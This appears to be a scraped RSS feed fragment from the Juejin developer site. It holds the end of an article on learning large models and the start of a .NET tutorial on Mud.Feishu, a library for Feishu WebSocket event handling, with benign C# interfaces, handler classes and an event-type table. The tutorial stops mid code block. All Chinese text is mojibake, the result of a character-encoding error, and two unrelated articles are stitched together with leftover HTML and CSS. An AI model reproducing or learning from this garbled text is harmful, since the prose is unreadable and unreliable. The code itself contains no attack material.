<p>ä½†æ˜¯ï¼Œç†è®ºä¸€æ–¹é¢æ˜¯ç”±ä¸¥è°¨çš„ç§‘å­¦é€»è¾‘æ¨å¯¼å‡ºæ¥çš„ï¼Œè¿˜ä¸€éƒ¨åˆ†æ˜¯æ ¹æ®å®è·µæ€»ç»“å’Œè°ƒæ•´çš„ï¼›å•çº¯çš„ç ”ç©¶ç†è®ºå¾ˆéš¾è®©ä½ çœŸæ­£ç†è§£æŠ€æœ¯çš„æœ¬è´¨ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæœ‰äº›é—®é¢˜åœ¨å­¦ä¹ çš„æ—¶å€™æ€ä¹ˆéƒ½æƒ³ä¸æ˜ç™½ï¼Œä½†ç­‰çœŸæ­£å»å®æ“çš„æ—¶å€™çªç„¶ä¹‹é—´å°±è±ç„¶å¼€æœ—ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<p>æœ€å¥½çš„å­¦ä¹ æ–¹å¼å°±æ˜¯ï¼Œåœ¨äº†è§£ä¸€äº›ç†è®ºçš„åŸºæœ¬æ¦‚å¿µä¹‹åï¼Œå°±ä¸Šæ‰‹æ‰¾ä¸ªå¤§æ¨¡å‹è¿›è¡Œå®æ“ï¼›ç„¶åç”¨å®æ“å»éªŒè¯ç†è®ºï¼Œè¿™æ ·æ‰èƒ½æ˜ç™½åˆ«äººä¸ºä»€ä¹ˆä¼šè¿™æ ·è®¾è®¡ï¼Œä¸ºä»€ä¹ˆå¯ä»¥è¿™æ ·åšï¼Œä¸å¯ä»¥é‚£æ ·åšã€‚â€â€â€â€â€â€â€â€â€â€â€é’»è¿›ç†è®ºå‡ºä¸æ¥ï¼Œå¹¶ä¸”ä¸è‚¯åŠ¨æ‰‹å®è·µçš„äººï¼Œå°±æ˜¯é‚£ç§ç»å¸¸é’»ç‰›è§’å°–çš„ï¼Œç†è®ºä¸€å¥—ä¸€å¥—çš„ï¼Œä½†å•¥éƒ½å¹²ä¸å¥½ï¼›è€Œä¸”æœ€é‡è¦çš„æ˜¯ï¼Œè¿™ç§é’»ç‰›è§’å°–çš„æ–¹å¼å¾€å¾€ä¼šäº‹åŠåŠŸå€ï¼Œå¯¼è‡´åŠé€”è€ŒåºŸã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<h3 data-id="heading-6">6ã€ç®—æ³•åŸºç¡€</h3>
<p>ç®—æ³•çš„é‡è¦æ€§å°±ä¸ç”¨å¤šè¯´äº†ï¼Œä»»ä½•å’Œè®¡ç®—æœºæœ‰å…³çš„ä¸œè¥¿éƒ½ç¦»ä¸å¼€ç®—æ³•ï¼Œå¦‚æœè¯´ç¡¬ä»¶æ˜¯è®¡ç®—æœºçš„èº«ä½“ï¼Œé‚£ä¹ˆç®—æ³•å°±æ˜¯è®¡ç®—æœºçš„çµé­‚ã€‚â€â€â€å¤§æ¨¡å‹å¯ä»¥è¯´æ˜¯ç®—æ³•çš„é›†å¤§æˆè€…ï¼Œå› ä¸ºå¤§æ¨¡å‹æ˜¯åŸºäºä¸¥è°¨çš„æ•°å­¦ç†è®ºæ¨å¯¼çš„ï¼Œè€Œç®—æ³•æ˜¯æ•°å­¦åœ¨è®¡ç®—æœºä¸­çš„è½½ä½“ï¼Œç¦»å¼€äº†ç®—æ³•å¤§æ¨¡å‹å°†ä¸å¤å­˜åœ¨ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<p>ä»¥ä¸Šå°±æ˜¯ä¸€äº›å­¦ä¹ å¤§æ¨¡å‹æŠ€æœ¯æ‰€éœ€è¦çš„åŸºç¡€ï¼Œä½†å¹¶ä¸æ˜¯å…¨éƒ¨ï¼›å¤§æ¨¡å‹æŠ€æœ¯æ˜¯äººå·¥æ™ºèƒ½æŠ€æœ¯çš„ä¸€ç§å®ç°æ–¹å¼ï¼Œè€Œäººå·¥æ™ºèƒ½æŠ€æœ¯æ˜¯ä¸€ä¸ªå¤šå­¦ç§‘äº¤å‰çš„ç§‘å­¦ï¼Œæ¶‰åŠåˆ°æ•°å­¦ï¼Œç¤¾ä¼šå­¦ï¼Œå“²å­¦ï¼Œè®¡ç®—æœºç§‘å­¦ï¼Œå·¥ç¨‹å­¦ï¼Œæ§åˆ¶è®ºç­‰ç­‰ï¼Œç”šè‡³åŒ…æ‹¬æ–‡å­¦ä¸è‰ºæœ¯ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<p>å› æ­¤ï¼Œè¦æƒ³å­¦å¥½å¤§æ¨¡å‹ï¼ŒæŠ€æœ¯åªæ˜¯æœ€åŸºç¡€çš„ä¸œè¥¿ã€‚ä¸‡ä¸ˆé«˜æ¥¼å¹³åœ°èµ·ï¼Œå…¨é æœ‰ä¸ªå¥½åœ°åŸºã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<h3 data-id="heading-7">å­¦ä¹ èµ„æºæ¨è</h3>
<p>å¦‚æœä½ æƒ³æ›´æ·±å…¥åœ°å­¦ä¹ å¤§æ¨¡å‹ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›éå¸¸æœ‰ä»·å€¼çš„å­¦ä¹ èµ„æºï¼Œè¿™äº›èµ„æºå°†å¸®åŠ©ä½ ä»ä¸åŒè§’åº¦å­¦ä¹ å¤§æ¨¡å‹ï¼Œæå‡ä½ çš„å®è·µèƒ½åŠ›ã€‚</p>
<blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€åˆ†é’Ÿå®ç°.NETä¸é£ä¹¦é•¿è¿æ¥çš„WebSocketæ¶æ„]]></title>    <link>https://juejin.cn/post/7580940585692053542</link>    <guid>https://juejin.cn/post/7580940585692053542</guid>    <pubDate>2025-12-08T03:03:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580940585692053542" data-draft-id="7580564126403346482" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€åˆ†é’Ÿå®ç°.NETä¸é£ä¹¦é•¿è¿æ¥çš„WebSocketæ¶æ„"/> <meta itemprop="keywords" content="åç«¯,.NET,C#"/> <meta itemprop="datePublished" content="2025-12-08T03:03:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="mudtools"/> <meta itemprop="url" content="https://juejin.cn/user/2112621078650964"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€åˆ†é’Ÿå®ç°.NETä¸é£ä¹¦é•¿è¿æ¥çš„WebSocketæ¶æ„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2112621078650964/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    mudtools
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:03:23.000Z" title="Mon Dec 08 2025 03:03:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>é£ä¹¦æœåŠ¡ç«¯SDKå·²å…¨é¢æ”¯æŒJavaã€Goã€Pythonä¸Node.jsç­‰ä¸»æµå¼€å‘è¯­è¨€ï¼Œç„¶è€Œ.NETç”Ÿæ€ç³»ç»Ÿçš„å¼€å‘è€…ä»¬å´é¢ä¸´ç€å®˜æ–¹SDKç¼ºå¤±çš„å›°å¢ƒï¼Œè¿™æ— ç–‘ä¸º.NETç¤¾åŒºæ¥å…¥é£ä¹¦å¹³å°å¸¦æ¥äº†ä¸ä¾¿ã€‚</p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€.netä¸­å¦‚ä½•å®ç°é£ä¹¦WebSocketé•¿è¿æ¥</h2>
<h3 data-id="heading-1">ä¸ºä»€ä¹ˆé€‰æ‹©é£ä¹¦WebSocketï¼Ÿ</h3>
<p>ç›¸è¾ƒäºä¼ ç»Ÿçš„Webhookæ¨¡å¼ï¼Œé•¿è¿æ¥æ¨¡å¼å¤§å¤§é™ä½äº†æ¥å…¥æˆæœ¬ï¼Œå°†åŸå…ˆ1å‘¨å·¦å³çš„å¼€å‘å‘¨æœŸé™ä½åˆ°5åˆ†é’Ÿã€‚</p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>å¼€å‘ä¾¿æ·</strong>ï¼šæ— éœ€å…¬ç½‘IPæˆ–åŸŸåï¼Œæœ¬åœ°ç¯å¢ƒå³å¯æ¥æ”¶å›è°ƒ</li>
<li><strong>å®‰å…¨ä¼ è¾“</strong>ï¼šå†…ç½®åŠ å¯†å’Œé‰´æƒï¼Œæ— éœ€é¢å¤–å®‰å…¨å¤„ç†</li>
<li><strong>å®æ—¶æ€§å¼º</strong>ï¼šæ¶ˆæ¯å»¶è¿Ÿä»åˆ†é’Ÿçº§é™è‡³æ¯«ç§’çº§</li>
<li><strong>èµ„æºé«˜æ•ˆ</strong>ï¼šé¿å…é¢‘ç¹HTTPè¯·æ±‚ï¼Œè¿æ¥å¤ç”¨å¤šç§äº‹ä»¶ç±»å‹</li>
</ul>
<p><strong>ä¼ä¸šçº§åº”ç”¨åœºæ™¯</strong></p>
<p>é£ä¹¦å¹³å°æä¾›ä¸°å¯Œçš„äº‹ä»¶ç±»å‹ï¼Œæ”¯æŒï¼š</p>
<ul>
<li><strong>ç”¨æˆ·äº‹ä»¶</strong>ï¼šå‘˜å·¥å…¥èŒ/ç¦»èŒè‡ªåŠ¨åŒ–å¤„ç†</li>
<li><strong>æ¶ˆæ¯äº‹ä»¶</strong>ï¼šæ™ºèƒ½å®¢æœã€æ¶ˆæ¯æœºå™¨äºº</li>
<li><strong>å®¡æ‰¹äº‹ä»¶</strong>ï¼šOAç³»ç»Ÿé›†æˆã€è‡ªåŠ¨å®¡æ‰¹</li>
<li><strong>éƒ¨é—¨äº‹ä»¶</strong>ï¼šç»„ç»‡æ¶æ„åŒæ­¥ç®¡ç†</li>
<li><strong>å…¶å®ƒäº‹ä»¶</strong>ï¼š.....</li>
</ul>
<p><strong>Mud.Feishuæ¶æ„è®¾è®¡</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant FS as é£ä¹¦å¹³å°
    participant WS as Mud.Feishu.WebSocketè¿æ¥
    participant MF as Mud.Feishu.Abstractionsæ¡†æ¶
    participant APP as ä¸šåŠ¡åº”ç”¨
    
    FS-&gt;&gt;WS: äº‹ä»¶æ¨é€
    WS-&gt;&gt;MF: æ¶ˆæ¯è·¯ç”±
    MF-&gt;&gt;MF: äº‹ä»¶è¯†åˆ«
    MF-&gt;&gt;APP: ä¸šåŠ¡å¤„ç†
    APP-&gt;&gt;MF: å¤„ç†ç»“æœ
    MF-&gt;&gt;WS: ACKç¡®è®¤
    WS-&gt;&gt;FS: çŠ¶æ€åé¦ˆ
</code></pre>
<h2 data-id="heading-2">äºŒã€æŠ½è±¡å±‚è®¾è®¡ï¼ˆMud.Feishu.Abstractionsï¼‰</h2>
<h3 data-id="heading-3">äº‹ä»¶å¤„ç†ç­–ç•¥æ¨¡å¼</h3>
<p>Mud.Feishué‡‡ç”¨ç­–ç•¥æ¨¡å¼å®ç°çµæ´»çš„äº‹ä»¶å¤„ç†æœºåˆ¶ï¼Œæ ¸å¿ƒæ¥å£è®¾è®¡ç®€æ´è€Œå¼ºå¤§ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> é£ä¹¦äº‹ä»¶å¤„ç†å™¨æ¥å£</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IFeishuEventHandler</span>
{
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ”¯æŒçš„äº‹ä»¶ç±»å‹</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-built_in">string</span> SupportedEventType { <span class="hljs-keyword">get</span>; }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å¤„ç†äº‹ä»¶</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function">Task <span class="hljs-title">HandleAsync</span>(<span class="hljs-params">EventData eventData, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>;
}
</code></pre>
<p><strong>ç­–ç•¥æ¨¡å¼æ ¸å¿ƒä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>ğŸ¯ <strong>å•ä¸€èŒè´£</strong>ï¼šæ¯ä¸ªå¤„ç†å™¨ä¸“æ³¨ç‰¹å®šäº‹ä»¶ç±»å‹</li>
<li>ğŸ”§ <strong>å¼€é—­åŸåˆ™</strong>ï¼šå¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å°é—­</li>
<li>ğŸ§ª <strong>å¯æµ‹è¯•æ€§</strong>ï¼šç‹¬ç«‹æµ‹è¯•ï¼Œä¾èµ–æ¸…æ™°</li>
<li>âš¡ <strong>è¿è¡Œæ—¶å¤šæ€</strong>ï¼šåŠ¨æ€é€‰æ‹©å¤„ç†ç­–ç•¥</li>
</ul>
<p><strong>å®é™…åº”ç”¨ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// ç”¨æˆ·åˆ›å»ºäº‹ä»¶å¤„ç†å™¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">UserCreatedEventHandler</span> : <span class="hljs-title">IFeishuEventHandler</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> SupportedEventType =&gt; <span class="hljs-string">"contact.user.created_v3"</span>;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">HandleAsync</span>(<span class="hljs-params">EventData eventData, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">var</span> user = JsonSerializer.Deserialize&lt;UserData&gt;(eventData.EventJson);
        <span class="hljs-keyword">await</span> _userService.CreateUserAsync(user, cancellationToken);
        _logger.LogInformation(<span class="hljs-string">"ç”¨æˆ·åˆ›å»ºäº‹ä»¶å¤„ç†å®Œæˆ: {UserId}"</span>, user.UserId);
    }
}

<span class="hljs-comment">// æ¶ˆæ¯æ¥æ”¶äº‹ä»¶å¤„ç†å™¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">MessageReceiveEventHandler</span> : <span class="hljs-title">IFeishuEventHandler</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> SupportedEventType =&gt; <span class="hljs-string">"im.message.receive_v1"</span>;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">HandleAsync</span>(<span class="hljs-params">EventData eventData, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">var</span> message = JsonSerializer.Deserialize&lt;MessageData&gt;(eventData.EventJson);
        <span class="hljs-keyword">await</span> _messageService.ProcessMessageAsync(message, cancellationToken);
    }
}
</code></pre>
<h3 data-id="heading-4">äº‹ä»¶ç±»å‹ä¸æ•°æ®æ¨¡å‹</h3>
<p><strong>EventDataç»Ÿä¸€äº‹ä»¶æ¨¡å‹</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> é£ä¹¦äº‹ä»¶æ•°æ®æ¨¡å‹ - ç»Ÿä¸€çš„äº‹ä»¶è½½ä½“</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">EventData</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> EventId { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-built_in">string</span>.Empty;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> EventType { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-built_in">string</span>.Empty;
    <span class="hljs-keyword">public</span> DateTime EventTime { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = DateTime.UtcNow;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">object</span>? Event { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> EventJson { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-built_in">string</span>.Empty;
}
</code></pre>
<p><strong>ä¸»è¦äº‹ä»¶ç±»å‹</strong></p>




























































<table><thead><tr><th>ç±»åˆ«</th><th>äº‹ä»¶ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>ç”¨æˆ·ç®¡ç†</strong></td><td><code>contact.user.created_v3</code></td><td>ç”¨æˆ·åˆ›å»º</td></tr><tr><td/><td><code>contact.user.updated_v3</code></td><td>ç”¨æˆ·æ›´æ–°</td></tr><tr><td/><td><code>contact.user.deleted_v3</code></td><td>ç”¨æˆ·åˆ é™¤</td></tr><tr><td><strong>æ¶ˆæ¯äº‹ä»¶</strong></td><td><code>im.message.receive_v1</code></td><td>æ¥æ”¶æ¶ˆæ¯</td></tr><tr><td/><td><code>im.message.message_read_v1</code></td><td>æ¶ˆæ¯å·²è¯»</td></tr><tr><td><strong>éƒ¨é—¨ç®¡ç†</strong></td><td><code>contact.department.created_v3</code></td><td>éƒ¨é—¨åˆ›å»º</td></tr><tr><td/><td><code>contact.department.updated_v3</code></td><td>éƒ¨é—¨æ›´æ–°</td></tr><tr><td><strong>å®¡æ‰¹æµç¨‹</strong></td><td><code>approval.approval.approved_v1</code></td><td>å®¡æ‰¹é€šè¿‡</td></tr><tr><td/><td><code>approval.approval.rejected_v1</code></td><td>å®¡æ‰¹æ‹’ç»</td></tr><tr><td>...</td><td><code>...</code></td><td>...</td></tr></tbody></table>
<p><strong>å¼ºç±»å‹æ•°æ®æ¨¡å‹ç¤ºä¾‹</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// ç”¨æˆ·åˆ›å»ºäº‹ä»¶æ•°æ®</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">UserCreatedEvent</span>
{
    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">"user_id"</span>)</span>]
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> UserId { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    
    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">"name"</span>)</span>]
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Name { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    
    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">"email"</span>)</span>]
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Email { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
}

<span class="hljs-comment">// æ¶ˆæ¯æ¥æ”¶äº‹ä»¶æ•°æ®</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">MessageReceiveEvent</span>
{
    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">"message_id"</span>)</span>]
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> MessageId { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    
    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">"chat_id"</span>)</span>]
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> ChatId { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    
    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">"content"</span>)</span>]
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Content { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
}
</code></pre>
<h3 data-id="heading-5">å·¥å‚æ¨¡å¼åº”ç”¨</h3>
<p><strong>äº‹ä»¶å¤„ç†å™¨å·¥å‚</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> äº‹ä»¶å¤„ç†å™¨å·¥å‚æ¥å£</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IFeishuEventHandlerFactory</span>
{
    IFeishuEventHandler? GetHandler(<span class="hljs-built_in">string</span> eventType);
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RegisterHandler</span>(<span class="hljs-params">IFeishuEventHandler handler</span>)</span>;
    <span class="hljs-function">IReadOnlyList&lt;<span class="hljs-built_in">string</span>&gt; <span class="hljs-title">GetRegisteredEventTypes</span>()</span>;
}
</code></pre>
<p><strong>æ ¸å¿ƒå®ç°ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ğŸ­ <strong>åŠ¨æ€ç®¡ç†</strong>ï¼šæ”¯æŒè¿è¡Œæ—¶æ³¨å†Œ/æ³¨é”€äº‹ä»¶å¤„ç†å™¨</li>
<li>ğŸ”’ <strong>çº¿ç¨‹å®‰å…¨</strong>ï¼šä½¿ç”¨ConcurrentDictionaryç¡®ä¿å¹¶å‘å®‰å…¨</li>
<li>ğŸ¯ <strong>ç²¾ç¡®åŒ¹é…</strong>ï¼šæ ¹æ®äº‹ä»¶ç±»å‹å¿«é€Ÿå®šä½å¯¹åº”å¤„ç†å™¨</li>
<li>ğŸ“Š <strong>çŠ¶æ€ç›‘æ§</strong>ï¼šæä¾›å·²æ³¨å†Œå¤„ç†å™¨çš„æŸ¥è¯¢èƒ½åŠ›</li>
</ul>
<p><strong>ä½¿ç”¨ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// æ³¨å†Œäº‹ä»¶å¤„ç†å™¨</span>
